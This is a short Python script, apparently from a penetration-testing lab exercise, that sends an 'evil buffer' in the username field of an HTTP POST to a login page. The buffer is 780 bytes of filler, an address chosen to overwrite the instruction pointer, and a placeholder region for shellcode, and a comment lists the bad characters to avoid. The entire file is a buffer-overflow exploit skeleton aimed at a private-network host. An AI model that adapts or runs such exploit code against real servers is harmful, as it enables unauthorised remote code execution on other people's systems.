#!/usr/bin/python3
import socket

#badchars are \x00\x0a\x0d\x25\x26\x2b\x3d


try:
  print ("\nSending evil buffer...")
  
  filler = b"A" * 780
  eip = b"\x83\x0c\x09\x10"
  offset = b"C" * 4
  shellcode = b"D" * (1500 - len(filler) - len(eip) - len(offset))
  inputBuffer = filler + eip + offset + shellcode
  
  content = b"username=" + inputBuffer + b"&password=A"
  


  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: 10.11.0.22\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  
  buffer += content

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.1.102", 80))
  s.send(buffer)
  
  s.close()
  
  print (buffer)
  
except socket.error:
  print (socket.error)
